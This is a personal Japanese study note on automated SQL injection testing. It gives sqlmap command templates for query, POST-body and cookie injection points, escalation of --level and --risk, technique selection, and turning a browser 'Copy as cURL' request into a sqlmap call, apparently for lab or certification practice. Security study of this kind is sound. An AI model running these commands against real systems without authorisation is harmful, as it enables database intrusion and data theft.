[[⚡️SQLi - Automated]]

#### 注目ポイント

- Advances search機能
- Refine your search機能
- 長めのCookie (Tracking ID等)
- ⚠️Check Stock機能などXMLのPOSTリクエスト -> [[🔍XXEi#& SQLi]]に従う

---
## Fuzz w/ SQLmap

- もしCheckStock機能ならDo Active Scanを全体にかける

###### 💡Tips

- まずは怪しいパラメタをIntruderで選択してScan。DBMSの種類を特定する。
	- SQLmapでは時間がかかってもScannerならすぐ発見する場合もある
- 同時に早いSQLmapをかけておく(ScannerによってDBMSと脆弱なパラメタがわかれば指定すること。Cookieが特殊なものならcookieも忘れずに！)
```zsh
sqlmap -u "[url]" --batch --threads 7 --level 3 --risk 3
```

- 開発者ツールのNetworkタブから該当リクエストを右クリック -> Copy -> Copy as cURLで
 ![[Pasted image 20240218133448.png | 200]]
	 ↓以下の形式でCopyが可能 
![[Pasted image 20240218133604.png]]
- この`curl`を`sqlmap -u`に変更する。`--compressed`は削除。最後の行の`\`も削除し他のオプションを続ける

- それからSQLmapにかけることで確実 & 時短になる

###### 基本形

SQLmapにかけるにはパラメタが必要。クエリストリング or POSTのbody部 or Cookie
```bash
sqlmap -u '[URL]' --batch --dbms [DBMS] -p '[脆弱なparam]' --threads 5\
```

###### POSTのボディへのSQLi

```bash
--data 'search=*' \
```

###### CookieへのSQLi（ログイン済みじゃないと使えない機能も忘れずにcookieつけること）

- ProxyのHistoryを確認し、302でログインページに飛ばされているなら、大体cookieのつけ忘れか有効期限ぎれ
```bash
--cookie 'TrackingId=xx*; OTHER-COOKIE-KV' \
```

###### 怪しいのに見つからなければレベル上げる

- 最初からこれすると非常に時間がかかるので注意
- まずは`--risk 3`だけ試すこと
```zsh
--risk 3
```
	↓
```bash
--level 5 --risk 3
```
==⚠️==：levelをあげると検出に時間がかかるので、その間にもう1つのアプリの脆弱性を検出すること(riskは変更しても変わらん)

⭐️`--technique`はB, E, Uが早い

#### 💡検出が遅い場合の高速化テクニック

```
--threads=5
```
- 1~10。1がデフォルト
- 早いと誤った情報を抽出したり、脱字がある

##### 🚨

###### 検出PaloadにSleepが含まれている場合

- めちゃくちゃ時間がかかる。
- 指定した`--level`が低いからそれを検出しただけかもしれない...悪用に入る前に以下を実行する↓
- 検出されたPayloadを実際に埋め込んでみてエラーが返るなら、Error-basedだと想定して以下を実行。Error-basedが検出されたら儲けもの
```zsh
sqlmap -u '[URL]' --batch --output-dir [出力先dir] --dbms [DBMS] -p '[脆弱なparam]' --level 5 --flush-session --technique E
```

---
#### SQLMapの解説

- `*`はここにSQLiを試行してという指示。`-p`でも可能
- `--flush-session`: 以前実行したSQLmapの実行結果をキャッシュしているセッションを無視してクリアな状態でターゲットをテストする
- [SQLMAP Help usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)は一番詳しい
- [HackTricks: SQL map](https://book.hacktricks.xyz/v/jp/pentesting-web/sql-injection/sqlmap)は具体例つき
- 履歴は指定しない限り、`/Users/おれ/.local/share/sqlmap`に出力される

###### ⚠️

- DBMSは結果欄にまとめてではなく、別の場所に書いてたりする
- 結果も複数になる可能性がある
![[Pasted image 20240219154316.png]]

---

###### 実務において...

- トラフィック量がえげつないので普通は使わない